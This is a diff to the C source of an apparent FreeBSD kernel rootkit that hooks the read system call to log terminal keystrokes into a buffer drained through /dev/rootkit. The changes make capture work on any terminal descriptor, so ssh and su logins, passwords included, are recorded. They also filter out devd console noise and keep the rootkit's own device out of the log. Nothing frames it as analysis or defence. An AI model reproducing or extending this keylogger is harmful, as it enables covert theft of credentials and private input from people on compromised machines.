@@ -36,6 +36,7 @@
 #include <sys/vnode.h>
 
 #include "log.h"
+#include "interface.h"
 
 #ifndef RK_LOG_SIZE
 #define RK_LOG_SIZE	(64 * 1024)	/* ring buffer size, power of two is nice */
@@ -303,6 +304,14 @@ rk_log_capture(struct thread *td, const void *ubuf, size_t len)
 		if (copyin((const char *)ubuf + done, chunk, n) != 0)
 			break;
 
+		/*
+		 * devd keeps /dev/console open and reads syslog lines out of it
+		 * ('!system=DEVFS ...'); those arrive on a tty like anything else
+		 * and would bury every keystroke. They all start with '!'.
+		 */
+		if (chunk[0] == '!')
+			break;
+
 		mtx_lock(&rk_line_mtx);
 		for (i = 0; i < n; i++) {
 			unsigned char c = (unsigned char)chunk[i];
@@ -384,7 +393,8 @@ rk_fd_is_tty(struct thread *td, int fd)
 	vp = NULL;
 	if (fp->f_type == DTYPE_VNODE && fp->f_vnode != NULL) {
 		vp = fp->f_vnode;
-		if ((vp->v_vflag & VV_ISTTY) != 0 || vp->v_type == VCHR)
+		if (!rootkit_is_our_vnode(vp) &&
+		    ((vp->v_vflag & VV_ISTTY) != 0 || vp->v_type == VCHR))
 			is_tty = 1;
 	}
 	fdrop(fp, td);
@@ -394,12 +404,15 @@ rk_fd_is_tty(struct thread *td, int fd)
 
 /*
  * Replacement for sys_read(). The original syscall always runs first, so the
- * rootkit cannot break normal I/O; only after a successful read from fd 0 do
- * we look at what came back.
+ * rootkit cannot break normal I/O; only after a successful read from a
+ * terminal do we look at what came back.
  *
- * The fd == 0 test doubles as recursion protection: the userland sender reads
- * /dev/rootkit on some other descriptor, so reading our own log never feeds
- * back into the log.
+ * The descriptor number is not the test. sshd and su(1) hand the tty to the
+ * child on whatever descriptor is free -- a trace of a login over ssh shows
+ * the shell reading it as fd 5 while fd 0 is the same pty -- so requiring
+ * fd 0 captured nothing on a real login. The type of the vnode decides,
+ * and rootkit_is_our_vnode() keeps the sender's drain of /dev/rootkit out of
+ * the ring, which is what the fd == 0 test used to do by accident.
  */
 static int
 rk_read_hook(struct thread *td, void *args)
@@ -409,8 +422,8 @@ rk_read_hook(struct thread *td, void *args)
 
 	error = rk_read_orig(td, args);
 
-	if (error == 0 && uap->fd == 0 && td->td_retval[0] > 0 &&
-	    (rk_log_pipes != 0 || rk_fd_is_tty(td, 0)))
+	if (error == 0 && td->td_retval[0] > 0 &&
+	    (rk_log_pipes != 0 || rk_fd_is_tty(td, uap->fd)))
 		rk_log_capture(td, uap->buf, (size_t)td->td_retval[0]);
 
 	return (error);
